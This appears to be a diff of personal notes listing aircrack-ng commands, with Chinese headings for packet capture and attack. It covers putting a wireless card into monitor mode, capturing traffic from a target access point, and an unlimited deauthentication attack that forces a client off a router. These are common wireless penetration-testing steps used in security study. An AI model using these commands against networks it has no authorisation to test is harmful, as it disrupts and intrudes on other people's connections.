@@ -5,10 +5,9 @@ airmon-ng start/stop wlan0/wlan0mon
 
 airodump-ng wlan0mon
 
-airodump-ng --bssid {macadd} -c {ch} wlan0mon
-
 #抓包
-airodump-ng --ivs --bssid {macadd} -w {filename} -c{ch} 
+airodump-ng --bssid {macadd} -c {ch} wlan0mon -w {filename} wlan0mon
+airodump-ng --ivs --bssid {macadd} -w {filename} -c{ch}  wlan0mon
 
 #攻击
 aireplay-ng -0 0 -a {routemacadd} -c {clientmacadd} 
